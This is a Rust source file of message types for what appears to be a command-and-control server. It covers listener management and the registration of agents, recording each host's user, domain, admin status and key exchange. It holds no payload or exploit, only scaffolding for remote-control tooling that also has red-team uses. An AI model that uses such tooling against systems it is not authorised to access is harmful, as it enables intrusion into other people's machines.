use application::domain::model::{agent_model::AgentModel, id::{AgentId, ListenerId}, listener_model::ListenerModel};
use tokio::sync::oneshot;

pub enum C2Message {
    AddListener {
        listener: ListenerModel,
        reply: oneshot::Sender<anyhow::Result<ListenerModel>>,
    },
    RemoveListener {
        listener_id: ListenerId,
        reply: oneshot::Sender<anyhow::Result<()>>,
    },
    ListListeners {
        reply: oneshot::Sender<anyhow::Result<Vec<ListenerModel>>>,
    },
    AddAgent {
        listener_id: ListenerId,
        process_id: u64,
        thread_id: u64,
        arch: String,
        is_admin: bool,
        process_name: String,
        os: String,
        domain_name: String,
        computer_name: String,
        user_name: String,
        received_pubkey: [u8; 32],
        reply: oneshot::Sender<anyhow::Result<(AgentModel, [u8;32])>>,
    },
    ListAgent {
        listener_id: ListenerId,
        reply: oneshot::Sender<anyhow::Result<Vec<AgentModel>>>,
    },
    QueryAgent {
        agent_id: AgentId,
        reply: oneshot::Sender<anyhow::Result<Option<AgentModel>>>,
    },
    ToListener { listener_id: ListenerId, msg: ListenerMessage },
    ToAgent { agent_id: AgentId, msg: AgentMessage },
}

pub enum ListenerMessage {
    Start {
        reply: oneshot::Sender<anyhow::Result<()>>,
    },
    Stop {
        reply: oneshot::Sender<anyhow::Result<()>>,
    },
}

pub enum AgentMessage {
    LookupSharedSecret { reply: oneshot::Sender<anyhow::Result<[u8; 32]>>}
}
